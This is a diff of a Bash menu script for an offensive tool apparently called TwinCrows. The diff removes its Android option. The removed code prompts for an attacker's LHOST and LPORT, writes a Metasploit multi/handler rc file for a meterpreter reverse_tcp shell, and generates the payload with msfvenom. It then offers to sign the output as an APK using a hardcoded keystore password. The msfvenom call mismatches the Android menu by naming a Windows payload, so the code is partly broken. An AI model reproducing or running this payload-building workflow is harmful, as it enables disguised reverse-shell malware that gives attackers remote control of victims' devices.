@@ -572,7 +572,6 @@ tc_payload() {
 	echo -e "2 - Linux"
 	echo -e "3 - Mac"
 	echo -e "4 - Web"
-#	echo -e "5 - Android"
         echo
         echo -e "0 - voltar${normal}"
 
@@ -1017,100 +1016,6 @@ tc_payload() {
 			esac
 			done
 
-		;;
-		5)
-			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}Android${vermbold}]\n└─────►${normal}"
-			centralizado "${azulbold}===== Android Payloads =====\n\n${normal}"
-			echo -e "${cinza}Escolha uma das opcoes."
-
-			while :
-			do
-
-			echo -e "${verde}"
-			echo -e "1 - android/meterpreter/reverse_tcp"
-			echo
-			echo -e "0 - Voltar"
-
-			echo -e "${normal}"
-			printf $nvl3
-			read -p ' ' opcao3
-
-			echo
-
-			case $opcao3 in
-				"1")
-					if [ "$TCLang" == "en_US" ]
-					then
-						resp="yes"
-					elif [ "$TCLang" == "pt_BR" ]
-					then
-						resp="sim"
-					else
-						resp="si"
-					fi
-					echo $resp
-					echo -e "${verde}"
-					printf "Informe o LHOST: ${normalbold}"
-					read lhost
-					printf "${verde}Informe o LPORT: ${normalbold}"
-					read lport
-					printf "${verde}Informe o nome para o payload com extensao ex: aplicativo.apk: ${normalbold}"
-					read nome
-					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
-					read rc
-					_SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS"
-					unset _JAVA_OPTIONS
-					alias='java "$_SILENT_JAVA_OPTIONS"'
-
-					if [ "$rc" == "s" ]
-					then
-						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/android_payload.rc${normal}"
-						echo -e "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/android_payload.rc
-					fi
-					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
-					msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $TCPayloads/$nome
-					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome${normal}"
-					echo -e "\n"
-					printf "${verde}Deseja assinar este apk? [s/n]: ${normalbold}"
-					read apk
-					if [ "$apk" == "s" ]
-					then
-						echo -e "${azulbold}\nGerando a chave...${normal}"
-						if [ "$resp" == "si" ]
-						then
-							echo -e "${azulbold}Sera solicitado uma confirmacao para gerar a chave.\n${normal}"
-							printf 'TwinCrows\nTwinCrowa\n\n\n\n\n\n\n' | keytool -genkey -keystore payloads/TwinCrows.keystore -alias TwinCrows -keyalg RSA -keysize 2048 -validity 10000
-							echo -e "${azulbold}A senha da chave e: TwinCrows${normal}"
-						else
-							echo -e 'TwinCrows\nTwinCrows\n\n\n\n\n\n\n'$(echo $resp) | keytool -genkey -keystore $TCPath/payloads/TwinCrows.keystore -alias TwinCrows -keyalg RSA -keysize 2048 -validity 10000 2> /dev/null
-							echo -e "${azulbold}Chave gerada com suceso\nA senha da chave e: ${normalbold}TwinCrows${normal}"
-						fi
-					fi
-
-
-
-
-
-					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
-                		        read opcao
-                        		if [ "$opcao" == "s" ]
-                        		then
-                                		tc_payload
-                        		else
-                                		exec $TCPath/TwinCrows
-                        		fi
-				;;
-				"0")
-					tc_payload
-				;;
-				*)
-		                        echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
-                		 ;;
-
-
-			esac
-
-			done
 		;;
 
 
